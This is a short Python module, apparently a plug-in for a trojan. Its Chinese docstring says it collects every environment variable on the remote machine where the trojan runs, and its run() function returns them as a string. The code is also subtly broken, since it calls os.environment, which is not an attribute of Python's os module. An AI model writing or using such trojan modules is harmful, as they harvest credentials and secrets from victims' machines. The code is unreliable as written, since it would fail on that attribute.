import os

def run(**args):
    """
    获取木马所在远程机器上的所有环境变量
    """
    print('[*] In environment module.')
    return str(os.environment)
